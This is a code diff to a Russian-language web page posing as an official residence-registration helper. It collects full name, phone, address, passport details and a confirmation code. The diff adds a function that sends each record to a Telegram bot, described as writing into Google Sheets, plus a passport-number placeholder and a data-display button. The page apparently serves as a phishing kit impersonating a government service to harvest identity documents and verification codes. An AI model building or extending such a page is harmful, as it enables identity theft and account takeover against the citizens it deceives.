@@ -59,12 +59,12 @@
         <h2 id="welcome-message">📋 Добро пожаловать, 👋</h2>
         <p>Мы — ваш официальный помощник для оформления регистрации по месту жительства. Готовы начать оформление?</p>
         <div class="buttons">
-          <!-- УДАЛЕНО: ссылка "Открыть приложение Telegram" -->
           <button class="menu-btn" data-action="schedule">📋 Записаться на приём</button>
           <button class="menu-btn" data-action="documents">📜 Список документов</button>
           <button class="menu-btn" data-action="check-status">🔍 Проверить статус заявки</button>
           <button class="menu-btn" data-action="contact">📞 Связаться с поддержкой</button>
           <button class="menu-btn" data-action="faq">❓ Частые вопросы</button>
+          <button class="menu-btn" data-action="show-data">📊 Мои данные</button>
         </div>
       </div>
 
@@ -129,7 +129,7 @@
         <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
         <div class="input-group">
           <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
-          <input type="text" id="docnumber">
+          <input type="text" id="docnumber" placeholder="4510 123456">
           <div class="error" id="err-doc"></div>
         </div>
         <div class="buttons">
@@ -259,6 +259,14 @@
   </div>
 
   <script>
+    // === отправка в Telegram-бота ===
+    function sendViaTelegramBot(payload){
+      const tg = window.Telegram && window.Telegram.WebApp;
+      if (!tg) { console.warn("Откройте страницу через кнопку бота (WebApp)."); return; }
+      tg.sendData(JSON.stringify({ type: "lead", payload }));
+      tg.HapticFeedback?.impactOccurred?.("light");
+    }
+
     class MFCWizard{
       constructor(){
         this.steps=document.querySelectorAll('.step');
@@ -283,9 +291,9 @@
           else if(t.classList.contains('faq-btn')) this.handleFaqAction(t.dataset.faq);
         });
 
-        ['fullname', 'phone', 'address', 'docnumber', 'code', 'status-number', 'status-passport'].forEach(id => {
-          const input = document.getElementById(id);
-          input?.addEventListener('input', () => this.validateStep(this.currentStep));
+        ['fullname','phone','address','docnumber','code','status-number','status-passport'].forEach(id=>{
+          const input=document.getElementById(id);
+          input?.addEventListener('input',()=>this.validateStep(this.currentStep));
         });
       }
 
@@ -319,22 +327,35 @@
       handleNext(){
         if(!this.validateStep(this.currentStep)) return;
 
-        const nextSteps={
-          fullname:'phone',
-          phone:'address',
-          address:'document-type',
-          'document-type':'document-number',
-          'document-number':'code',
-          code:'main',
-          'status-number':'main',
-          'status-passport':'main'
-        };
-
-        if(nextSteps[this.currentStep]){
-          const currentEl=document.getElementById(this.currentStep);
-          if(currentEl && 'value' in currentEl) this.formData[this.currentStep]=currentEl.value.trim();
-          if(this.currentStep==='code') this.saveData();
-          this.showStep(nextSteps[this.currentStep]);
+        // Сохраняем значения конкретных полей перед переходом
+        if(this.currentStep==='fullname'){
+          this.formData.fullname = (document.getElementById('fullname')?.value || '').trim();
+          this.showStep('phone');
+          return;
+        }
+        if(this.currentStep==='phone'){
+          this.formData.phone = (document.getElementById('phone')?.value || '').trim();
+          this.showStep('address');
+          return;
+        }
+        if(this.currentStep==='address'){
+          this.formData.address = (document.getElementById('address')?.value || '').trim();
+          this.showStep('document-type');
+          return;
+        }
+        if(this.currentStep==='document-number'){
+          this.formData['document-number'] = (document.getElementById('docnumber')?.value || '').trim();
+          this.showStep('code');
+          return;
+        }
+        if(this.currentStep==='code'){
+          this.formData.code = (document.getElementById('code')?.value || '').trim();
+          this.saveData();              // ← сохраняем, показываем, отправляем
+          this.showStep('main');
+          return;
+        }
+        if(this.currentStep==='status-number' || this.currentStep==='status-passport'){
+          this.showStep('main'); return;
         }
       }
 
@@ -369,6 +390,7 @@
         else if(action==='faq') this.showStep('faq');
         else if(action==='status-number') this.showStep('status-number');
         else if(action==='status-passport') this.showStep('status-passport');
+        else if(action==='show-data'){ document.getElementById('data-output').classList.add('active'); window.scrollTo({top:document.body.scrollHeight, behavior:'smooth'}); }
         else if(action==='authorize') this.showStep('fullname');
         else if(action==='main') this.showStep('main');
         else if(doc){
@@ -423,17 +445,23 @@
       }
 
       saveData(){
-        const ts=new Date().toLocaleString('ru-RU');
-        const rec={
-          timestamp:ts,
-          fullname:this.formData.fullname||'',
-          phone:this.formData.phone||'',
-          address:this.formData.address||'',
-          document:`${this.formData['document-type']||''} ${this.formData['document-number']||''}`.trim(),
-          code:this.formData.code||''
+        const ts = new Date().toISOString(); // ISO — удобно для бота/таблицы
+        const rec = {
+          timestamp: ts,
+          fullname: this.formData.fullname || '',
+          phone:    this.formData.phone    || '',
+          address:  this.formData.address  || '',
+          document: `${this.formData['document-type']||''} ${this.formData['document-number']||''}`.trim(),
+          code:     this.formData.code     || ''
         };
+
+        // 1) Отправка в Telegram-бота (он запишет в Google Sheets)
+        sendViaTelegramBot(rec);
+
+        // 2) Локальный вывод в таблицу на странице
         this.dataStore.push(rec);
         this.renderDataTable();
+        document.getElementById('data-output').classList.add('active');
       }
 
       renderDataTable(){
